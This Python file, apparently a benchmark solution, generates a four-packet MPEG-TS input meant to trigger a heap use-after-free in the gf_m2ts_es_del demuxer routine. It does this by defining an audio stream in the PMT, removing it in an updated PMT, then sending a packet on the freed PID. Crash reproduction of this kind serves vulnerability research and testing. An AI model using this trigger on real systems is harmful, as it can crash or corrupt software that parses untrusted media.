import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) input to trigger a Heap Use After Free
        vulnerability in gf_m2ts_es_del.

        The vulnerability is triggered by sending a sequence of MPEG-TS packets that:
        1. Define a program with multiple elementary streams (e.g., video and audio) via PAT and PMT.
        2. Send an updated PMT with a new version number that removes one of the streams.
           This causes the demuxer to free the resources associated with the removed stream,
           calling gf_m2ts_es_del.
        3. Send a data packet (PES) for the PID of the now-removed stream.
           The demuxer attempts to process this packet using a dangling pointer to the
           freed stream context, causing a use-after-free.

        The PoC consists of four 188-byte TS packets:
        - Packet 1: PAT (Program Association Table)
        - Packet 2: PMT (Program Map Table) version 0, defining video and audio streams.
        - Packet 3: PMT (Program Map Table) version 1, removing the audio stream.
        - Packet 4: PES (Packetized Elementary Stream) packet for the removed audio PID to trigger the crash.
        """

        # Helper to calculate MPEG-TS CRC32 (standard CRC-32/MPEG-2)
        def crc32(data):
            return zlib.crc32(data) & 0xFFFFFFFF

        # Helper to build a Program Specific Information (PSI) section (PAT or PMT)
        def build_psi_section(table_id, table_data, version, id_num):
            section_payload = bytearray()
            # PAT uses transport_stream_id, PMT uses program_number
            section_payload.extend(id_num.to_bytes(2, 'big'))
            # version_number, current_next_indicator=1
            section_payload.append((0b11 << 6) | (version << 1) | 1)
            # section_number=0, last_section_number=0
            section_payload.extend(b'\x00\x00')
            section_payload.extend(table_data)

            # section_length: length of data following this field, including CRC32
            section_length = len(section_payload) + 4
            
            section = bytearray()
            section.append(table_id)
            # section_syntax_indicator=1, '0', reserved=11, section_length
            section.append(0b10110000 | (section_length >> 8))
            section.append(section_length & 0xFF)
            section.extend(section_payload)
            
            # Calculate and append CRC32
            section.extend(crc32(section).to_bytes(4, 'big'))
            return section

        # Helper to build a 188-byte Transport Stream (TS) packet
        def build_ts_packet(pid, payload, pusi, cc):
            # Header: sync(8), PUSI(1), prio(1), PID(13), TSC(2), AFC(2), CC(4)
            header = bytearray(b'\x47\x00\x00\x10') # Base header: payload only, no scrambling
            header[1] = (pusi << 6) | ((pid >> 8) & 0x1F)
            header[2] = pid & 0xFF
            header[3] |= (cc & 0x0F)
            
            packet = bytearray(188)
            packet[:4] = header
            packet[4:4+len(payload)] = payload
            # Pad the rest of the packet
            packet[4+len(payload):] = b'\xff' * (184 - len(payload))
            return packet

        poc = bytearray()
        continuity_counters = {}
        def get_next_cc(pid):
            continuity_counters.setdefault(pid, 0)
            val = continuity_counters[pid]
            continuity_counters[pid] = (val + 1) & 0xF
            return val

        # --- Define stream parameters ---
        pat_pid, pmt_pid = 0x0000, 0x0100
        program_number, transport_stream_id = 1, 1
        video_pid, audio_pid, pcr_pid = 0x0101, 0x0102, 0x0101
        RESERVED_BITS_13 = 0xE000 # 0b111...

        # --- Packet 1: PAT ---
        # Maps program_number to pmt_pid
        pat_table_data = program_number.to_bytes(2, 'big') + \
                         (RESERVED_BITS_13 | pmt_pid).to_bytes(2, 'big')
        pat_section = build_psi_section(0x00, pat_table_data, 0, transport_stream_id)
        # PSI sections starting in a packet need a 0x00 pointer_field
        poc.extend(build_ts_packet(pat_pid, b'\x00' + pat_section, 1, get_next_cc(pat_pid)))

        # --- Packet 2: PMT v0 (with video and audio streams) ---
        pmt_v0_table_data = bytearray((RESERVED_BITS_13 | pcr_pid).to_bytes(2, 'big'))
        pmt_v0_table_data.extend(b'\xF0\x00') # Program info length = 0
        # Stream 1: Video (H.264)
        pmt_v0_table_data.extend(b'\x1b' + (RESERVED_BITS_13 | video_pid).to_bytes(2, 'big') + b'\xF0\x00')
        # Stream 2: Audio (ADTS AAC)
        pmt_v0_table_data.extend(b'\x0f' + (RESERVED_BITS_13 | audio_pid).to_bytes(2, 'big') + b'\xF0\x00')
        pmt_v0_section = build_psi_section(0x02, pmt_v0_table_data, 0, program_number)
        poc.extend(build_ts_packet(pmt_pid, b'\x00' + pmt_v0_section, 1, get_next_cc(pmt_pid)))

        # --- Packet 3: PMT v1 (removes audio stream) ---
        pmt_v1_table_data = bytearray((RESERVED_BITS_13 | pcr_pid).to_bytes(2, 'big'))
        pmt_v1_table_data.extend(b'\xF0\x00') # Program info length = 0
        # Stream 1: Video (H.264) - audio stream is omitted
        pmt_v1_table_data.extend(b'\x1b' + (RESERVED_BITS_13 | video_pid).to_bytes(2, 'big') + b'\xF0\x00')
        pmt_v1_section = build_psi_section(0x02, pmt_v1_table_data, 1, program_number) # version=1
        poc.extend(build_ts_packet(pmt_pid, b'\x00' + pmt_v1_section, 1, get_next_cc(pmt_pid)))

        # --- Packet 4: PES packet for the removed audio stream to trigger UAF ---
        # Minimal PES header: start_code_prefix(3), stream_id(1), length(2)
        pes_payload = b'\x00\x00\x01\xc0\x00\x00'
        poc.extend(build_ts_packet(audio_pid, pes_payload, 1, get_next_cc(audio_pid)))

        return bytes(poc)
